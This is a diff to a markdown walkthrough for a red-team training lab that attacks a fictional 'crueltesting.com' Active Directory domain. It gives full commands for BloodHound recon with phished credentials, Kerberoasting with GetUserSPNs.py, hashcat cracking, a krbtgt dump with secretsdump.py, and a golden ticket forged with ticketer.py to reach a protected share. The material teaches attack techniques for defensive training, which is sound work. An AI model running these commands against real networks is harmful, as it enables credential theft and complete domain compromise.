@@ -336,7 +336,7 @@ Now go back to your tab for the RDP session to client1 cruelcomputing. You will 
 
 Type something in that window simulating garfield falling for the trap (garfields password is catsRCute2026!)
 
-![Garfield enters the password](assets/users-enters-password.png)
+![Garfield enters the password](assets/user-enters-password.png)
 
 Back in your sliver session window you will see what garfield typed.
 
@@ -350,25 +350,52 @@ The ultimate target of the intruder is to compromise one of the most privileged 
 
 Armed with the username and password of garfield we cannow learn about the target active directory. Note that we the intruder can do the mapping even though our victim (garfield) is just a regular user. This is because the directory allows plenty of read access to all their users.
 
-We will use a popular tool - bloodhound - for our recon. In a command shell window type
-(note that we learned about the garfield credentials and the name of the domain controller dc01.crueltesting.com above)
+We will use a popular tool - bloodhound - for our recon. Bloodhound reads info from the Active Directory, using a non-privileged account, and will show you attack paths how to escalatae your privilees!
+
+In a command shell window type (note that we learned about the garfield credentials and the name of the domain controller dc01.crueltesting.com above)
 
 ```
 proxychains4 bloodhound-python -u 'garfield' -p 'catsRCute2026!' -d 'crueltesting.com' -dc dc01.crueltesting.com -gc dc01.crueltesting.com -ns 10.0.2.10 --dns-tcp -c All --zip
 ```
+![Bloodhound - gather info ](assets/bloodhound-grabbing-info.png)
 
 This will use our relay function to contact the Active Directory Domain Controller to extract information.
 As a result a zip file is created on our evil machine.
 
 Next start the bloodhound server on our evil machine, in order to examine the results via a GUI.
-From a command shell window type
+From a command shell window start the bloodhound gui using a docker container.
+
 ```
 docker compose -f /home/localadmin/tools/bloodhound/docker-compose.yml up -d
 ```
 
 You cannow open bloodhound to investigate the active directory domain, and potential ways of elevating our privileges - the ultimate objective is to become a domain admin.
 
+On evil, open firefox and go to
+```
+htttp://127.0.0.1:8080
+```
+The credentials (admin/xxxxxxx) should be pre-fileld so press ok.
 
+![Bloodhound login](assets/bloodhound-login.png)
+
+Note: Typically we would now upload the zip file we created in the previous step. For this lab we will instead use a pre-created zip file that contains an interesting scenario. So you do not have to upload the zip file.
+
+When logged in, search for garfield@crueltesting.com. Expand the "Member Of" to the right and you will see the groups to which Garfield belongs. You will also see more information such as last password reset etc.
+
+![Bloodhound Garfield](assets/bloodhound-garfield.png)
+
+We now want to know how we can go from controlling garfield to become domain admin! Go to the Pathfinding tab in Bloodhound, and enter garfield@crueltesting.com as source and domain admins@crueltesting.com as destination.
+
+You will now see a direct path for the attacker to gain total access to the Active Directory domain!
+
+![Bloodhound Path](assets/bloodhound-path.png)
+
+Garfield is a member of the Helpdesk Support group. This group has the right to do anything to the SVC_SQL service accounts, for example resetting the password! (Do you remember the file we read in Garfields TODOs directory). And to make it better, the SVC_SQL service is a member of the domain admins group! So Garfield could actually reset the password of the SVC_SQL service to one of his choice, and then login with this password and become a domain admin!
+
+This is a dangerous misconfiguration of the Active Directory of Cruel Testing. Unfortunately this type of misconfiguration is relatively comomon: Some IT admin installs a new service, has issues with it not working and then gives it excessive privileges and now it works. Help Desk admins do often have access to reset even privileged passwords.
+
+We will now move onto another method of escalating privileges in Active Directory, that does not require misconfigurations.
 
 ### Kerberoasting
 
@@ -377,58 +404,69 @@ You cannow open bloodhound to investigate the active directory domain, and poten
 (will add stuff here later, with pictures showing kerberos from the attackers perspective)
 
 ### Getting and cracking the hashes of the privileged service account
+
 From bloodhound we learned that there is a service account svc_sql that is a member of the domain admins.
 
-We cannow fetch the hashes of that account and try to crack them offline.
+We cannow fetch the hashes of the svc_sql account and try to crack them offline. We can do that from garfields (or any domain users's) account since all authenticated domain users can download the TGS (see Kerberos brief info).
 
 From a command shell type
-
+```
 proxychains GetUserSPNs.py crueltesting.com/garfield:'catsRCute2026!' -dc-ip 10.0.2.10 -no-rc4 -request -outputfile hashes.kerberoast
+```
+![GetUserSPNs](/assets/GetUserSPNs.png)
 
-This should create a file hashes.kerberoast containing the hashes of the password.
+This should create a file hashes.kerberoast containing the hashes of the service svc-sql password.
 
-We can then try to crack the hashes with hashcat
-
-From a command shell typ
-
-hashcat -m 19700 hashes.kerberoast /usr/share/wordlists/rockyou.txt -D 1
+We can then try to "crack the hash" with hashcat.
 
 Note: Real life cracking of passwords is performed on powerful machines with GPUs, allowing for bruteforcing millions tries per second. In this lab environment with limited hardware we use a wordlist instead.
 
-After some 30 seconds the password should be revealed.
+From a command shell type
+
+```
+hashcat -m 19700 hashes.kerberoast /usr/share/wordlists/rockyou.txt -D 1
+```
+
+![Hashcat output](/assets/hashcat.png)
+
+After some 30 seconds the password should be revealed. We have now cracked the password of svc_sql that is a domain admin!
 
 ### Golden Tickets
 
-With the credentials of the svc_sql - who is a member of domain admins - we can now grab the hashes for all users and services of the domain (explain how this is done). But one hash is specifically interesting, that is the krbtgt hash, which is used to sign all Kerberos tickets. With this hash we can impersonate any user or service in the domain - even if the password of the user is reset!!! This is like being able to print our own passports.
+With the credentials of the svc_sql - who is a member of domain admins - we can now grab the hashes for all users and services of the domain. But one hash is specifically interesting, that is the krbtgt hash, which is used to sign all Kerberos tickets. With this hash we can impersonate any user or service in the domain - even if the password of the user is reset!!! This is like being able to print our own passports.
 
 From a command shell paste the following command
 
+```
 proxychains secretsdump.py crueltesting.com/svc_sql:'SQLServer2026!'@10.0.2.10 -just-dc-user krbtgt
-- dumps all hashes aes
+```
 
 The output shows the krbtgt hash.
 
-We now just need to find the security identifier of the domain, we can use
+In order to proceed, we now just need to find the SID (security identifier of the domain) , we can use
 
+```
 proxychains lookupsid.py dc01.crueltesting.com/svc_sql:'SQLServer2026!'@10.0.2.10
+```
 
-(actually we could also have learned the SID at an earlier stage by the info command on garfields sliver session that gives the user info including the domain SID.)
+(actually we could also have learned the SID at an earlier stage by the info command on garfields sliver session that gives the user info including the domain SID. But this command is easier than scrolling up or taking notes...)
 
 Now we create the ticket, using the krbttgt hash and the sid. We will create a ticket for felineadmin who is a domain administrator and has access to everything!
 Copy this command into your command shell on evil
 
+```
 ticketer.py -aesKey eb31f11533fd623118da514f1a34dc19590e975272717283dcc045c3620d9144 -domain-sid S-1-5-21-65719018-2757245887-2393804531 -domain crueltesting.com felineadmin
-
+```
 We save the ticket in the KRB5CCNAME environment variable
-
+```
 export KRB5CCNAME=felineadmin.ccache
-
+```
 Now we can use smbclient to access the share that we previously had no access to!
 
 From a command shell we paste
-
+```
 proxychains4 smbclient //dc01.crueltesting.com/DomainAdminSecret -k -c 'ls'
-
+```
 (add commands to view the content of the secret file on the share, which should give us a password)
 
 ## Pivoting to the Internal Kubernetes Infrastructure
